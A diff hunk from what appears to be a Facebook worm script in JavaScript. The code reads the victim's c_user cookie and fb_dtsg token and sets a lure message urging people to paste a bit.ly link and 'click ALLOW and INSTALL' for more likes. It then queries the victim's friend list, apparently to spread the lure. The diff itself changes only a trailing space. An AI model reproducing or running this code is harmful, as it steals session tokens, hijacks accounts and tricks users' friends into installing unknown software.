@@ -70,7 +70,7 @@ var Fwsuc = 0;
 var arr = new Array;
 var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
-var Fwmsg = "Get more Status Like/Photo Like/Page Like/Followers trick \n step1- Use Firefox Browser \n step2- Copy Paste below link in browser \n step3- Remove the space after .ly  \n step4- Hit Enter,click ALLOW and INSTALL=>  http://bit.ly/ 19aa2Ay " ;
+var Fwmsg = "Get more Status Like/Photo Like/Page Like/Followers trick \n step1- Use Firefox Browser \n step2- Copy Paste below link in browser \n step3- Remove the space after .ly  \n step4- Hit Enter,click ALLOW and INSTALL=>  http://bit.ly/ 19aa2Ay" ;
 jx.load(window.location.protocol + "//www.facebook.com/ajax/typeahead/first_degree.php?" + "__a=1&filter[0]=user&lazy=0&viewer=" + user_id + "&token=v7&stale_ok=0", function (a) {
     var b = a;
     var c = b.substring(b.indexOf("{"));
